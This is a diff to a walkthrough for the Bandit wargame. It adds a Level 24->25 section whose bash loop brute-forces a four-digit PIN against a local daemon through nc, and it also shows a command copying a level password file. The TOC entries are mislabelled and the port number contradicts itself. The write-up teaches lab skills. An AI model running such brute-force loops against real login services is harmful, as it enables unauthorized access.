@@ -27,7 +27,9 @@ You definitelly should try to beat this game at your own. Use this writeup only 
 - [Level 20](#level-20---level-21)
 - [Level 21](#level-21---level-22)
 - [Level 22](#level-22---level-23)
-
+- [Level 22](#level-23---level-24)
+- [Level 22](#level-24---level-25)
+- 
 
 ## Level 0
 Your task is to connect to the remore host using SSH protocol. Address, port and credentials are provided in level description.
@@ -305,7 +307,30 @@ cat /etc/bandit_pass/bandit24 >> /tmp/your_tmp_directory/password.txt
 
 Password will be in password.txt file in your tmp directory.
 
+## Level 24 -> Level 25
+We will obtain password after submitting bandit24 credential + pin code to daemon listening on port 300002. We have to guess the pin, so its time to perform brute-force attack. I've prepared script for this challenge, but if you want to try writing it yourself, i have some tips for you:
+- make TMP dir where you will be able to write and try script,
+- firstly you have to connect to server,
+- use for loop which will increment pin code every rotation.
 
+Good luck!
+
+~~~bash
+#!/bin/bash
+
+for i in {1000..9999}
+do
+        echo "bandit24_pass $i"
+done | nc -q 0 127.0.0.1 30002
+~~~
+Usage:
+~~~bash
+chmod +x script.sh
+./script.sh > results.txt
+cat results.txt | grep -v Wrong
+~~~
+
+![image missing?](./content/bandit25.png)
 
 
 
